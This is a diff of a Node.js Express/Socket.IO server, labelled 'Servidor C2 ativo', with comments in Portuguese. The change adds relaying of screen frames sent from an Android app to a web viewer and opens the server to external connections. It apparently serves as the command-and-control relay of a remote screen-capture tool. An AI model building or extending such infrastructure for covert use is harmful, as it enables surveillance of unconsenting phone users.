@@ -1,38 +1,54 @@
+// server.js
 const express = require('express');
 const http = require('http');
 const socketIo = require('socket.io');
 const cors = require('cors');
+const path = require('path'); // <-- Importe o módulo path
 
 const app = express();
 app.use(cors());
-app.use(express.json());
+
+// --- NOVA LINHA ---
+// Serve arquivos estáticos da pasta 'public'
+app.use(express.static(path.join(__dirname, 'public')));
 
 app.get('/', (req, res) => {
-  res.send('Servidor C2 ativo');
+  res.send('Servidor C2 ativo. Acesse /viewer.html para visualizar.');
 });
 
 const server = http.createServer(app);
 const io = socketIo(server, {
   cors: {
-    origin: '*',
+    origin: '*', // Em produção, restrinja isso ao seu domínio
   }
 });
 
 io.on('connection', socket => {
-  console.log('📡 Cliente conectado via WebSocket');
+  console.log(`📡 Cliente conectado: ${socket.id}`);
+
+  // --- NOVO OUVINTE ---
+  // Recebe os frames de tela do app Android
+  socket.on('screen_frame', data => {
+    console.log(`🖼️ Frame recebido de ${socket.id} | Tamanho: ${data.image.length} bytes`);
+    
+    // Re-transmite o frame para todos os outros clientes conectados (o visualizador web)
+    // Usamos socket.broadcast.emit para não enviar de volta para o próprio app Android
+    socket.broadcast.emit('screen_frame', data);
+  });
 
   socket.on('hora', data => {
-  console.log('🕒 Horário recebido:', data);
-  io.emit('hora', data); // ✅ envia para todos os clientes conectados
-});
+    console.log('🕒 Horário recebido:', data);
+    io.emit('hora', data);
+  });
 
   socket.on('disconnect', () => {
-    console.log('❌ Cliente desconectado');
+    console.log(`❌ Cliente desconectado: ${socket.id}`);
   });
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => {
+server.listen(PORT, '0.0.0.0', () => { // Adicionamos '0.0.0.0' para garantir que ele aceite conexões externas
   console.log(`🚀 Servidor rodando na porta ${PORT}`);
+  // Remova o localhost do log para não te confundir
+  console.log(`📺 O servidor está online e pronto para receber conexões!`);
 });
-
